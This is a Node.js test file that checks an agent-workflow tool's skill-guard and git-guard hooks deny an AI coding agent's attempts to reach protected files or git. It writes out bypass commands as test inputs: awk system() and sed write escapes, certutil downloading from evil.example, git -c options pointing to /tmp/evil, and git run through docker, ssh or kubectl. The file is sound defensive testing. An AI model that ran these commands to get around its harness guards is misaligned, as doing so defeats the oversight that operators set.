import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { test } from "node:test";

// Adversarial counterpart to hooks.test.mjs / shell-parsing.test.mjs: every case here is an attempt
// to reach a protected resource (task.json, .agents, git) through a command the guards must refuse.
const cli = join(process.cwd(), "dist", "agent-workflow.mjs");
const guard = (kind, command, extraArgs = []) => spawnSync(process.execPath, [cli, kind, "--platform", "Claude", ...extraArgs], {
  cwd: process.cwd(), encoding: "utf8", input: JSON.stringify({ tool_name: "bash", session_id: "s1", tool_input: { command } })
});
const denied = (kind, command, extraArgs = []) => {
  const result = guard(kind, command, extraArgs);
  assert.equal(result.status, 0, result.stderr);
  return /"permissionDecision":"deny"/.test(result.stdout);
};

// awk and sed are general interpreters with write paths no flag check can enumerate
// (`print > file`, `s///w`, `-i`), so neither is on the read-only allowlist at all.
const INTERPRETER_ESCAPES = [
  ["awk BEGIN{system(...)}", `awk 'BEGIN{system("cat .agents/skills/workflow/SKILL.md")}'`],
  ["awk redirecting print into a protected file", `awk 'BEGIN{print "x" > ".agents/skills/x/SKILL.md"}'`],
  ["sed -i editing a protected file", `sed -i 's/a/b/' .agents/skills/workflow/SKILL.md`],
  ["sed with a w flag", `sed -n 's/a/b/w .agents/skills/x/SKILL.md' input.txt`]
];
for (const [label, command] of INTERPRETER_ESCAPES) {
  test(`skill-guard denies ${label}`, () => {
    assert.equal(denied("skill-guard", command), true, command);
  });
}

// certutil is a general certificate/encoding tool that can download and write files; only its
// file-hashing mode reads, so the allowlist matches that exact four-token form and nothing else.
test("certutil is allowed only in its exact -hashfile <file> <algorithm> form", () => {
  assert.equal(denied("skill-guard", "certutil -urlcache -f http://evil.example/x .agents/skills/x/SKILL.md"), true);
  assert.equal(denied("skill-guard", "certutil -decode payload.b64 .agents/skills/x/SKILL.md"), true);
  assert.equal(denied("skill-guard", "certutil -hashfile .agents/skills/workflow/SKILL.md SHA256 -f"), true);
  assert.equal(denied("skill-guard", "certutil -hashfile .agents/skills/workflow/SKILL.md SHA256"), false);
});

// The runtime CLI is the only sanctioned writer of task.json, and that trust is granted to the
// recorded runtime hash — never to the name. A bare invocation with no hash record to check it
// against has no identity at all, so it is denied rather than believed.
test("a spoofed bare agent-workflow invocation is denied when no runtime hash record backs it", () => {
  const root = join(tmpdir(), `agent-workflow-spoof-${process.pid}-${Date.now()}`);
  assert.equal(denied("git-guard", "agent-workflow task-write --task-path t/task.json", ["--state-root", root]), true);
  assert.equal(denied("skill-guard", "agent-workflow install --root .agents", ["--state-root", root]), true);
});

// -c can point git at an alias or a hook, --exec-path relocates its helper binaries and --namespace
// re-points ref resolution: each turns a "read-only" subcommand into arbitrary execution.
const GIT_EXECUTION_ALTERING = [
  `git -c diff.external=/tmp/evil status`,
  `git -c core.fsmonitor=/tmp/evil status`,
  `git -c alias.st='!/tmp/evil' st`,
  `git --exec-path=/tmp/evil status`,
  `git --namespace=evil status`
];
for (const command of GIT_EXECUTION_ALTERING) {
  test(`git-guard denies an execution-altering global option: ${command}`, () => {
    assert.equal(denied("git-guard", command), true, command);
  });
}

// A carrier hands the command to something else to run, so the git call is not at the segment head
// where a head-anchored parser would look for it. Any such indirection is refused on sight.
const CARRIED_GIT = [
  `docker exec app git commit -m wip`,
  `podman exec app git push origin main`,
  `ssh build-host git push origin main`,
  `kubectl exec pod -- git reset --hard`
];
for (const command of CARRIED_GIT) {
  test(`git-guard denies git carried by a remote/container executor: ${command}`, () => {
    assert.equal(denied("git-guard", command), true, command);
  });
}
